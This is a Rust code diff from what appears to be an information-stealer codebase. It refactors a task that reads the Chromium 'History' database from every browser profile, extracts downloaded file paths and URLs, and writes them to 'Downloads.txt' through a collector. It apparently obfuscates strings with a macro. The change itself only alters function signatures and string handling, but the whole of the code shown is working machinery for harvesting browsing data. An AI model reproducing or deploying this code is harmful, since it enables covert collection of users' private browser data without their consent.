@@ -1,5 +1,5 @@
 use crate::chromium::BrowserData;
-use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Download};
+use crate::{read_and_collect_unique_records, to_string_and_write_all, Download, SqliteDatabase};
 use alloc::borrow::ToOwned;
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
@@ -27,7 +27,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for DownloadsTask {
     parent_name!("Downloads.txt");
 
     fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
-        let Some(mut downloads) = collect_and_read_sqlite_from_all_profiles(
+        let Some(mut downloads) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
             &self.browser.profiles,
             &StorageFileSystem,
             |profile| profile / s!("History"),
@@ -45,12 +45,12 @@ impl<C: Collector, F: FileSystem> Task<C, F> for DownloadsTask {
     }
 }
 
-fn extract_download_from_record(record: &dyn TableRecord) -> Option<Download> {
+fn extract_download_from_record<R: TableRecord>(record: &R) -> Option<Download> {
     let saved_as = record
         .get_value(DOWNLOADS_CURRENT_PATH)?
-        .as_string()?
-        .to_owned();
-    let url = record.get_value(DOWNLOADS_TAB_URL)?.as_string()?.to_owned();
+        .as_string()?;
+
+    let url = record.get_value(DOWNLOADS_TAB_URL)?.as_string()?;
 
     Some(Download { saved_as, url })
 }
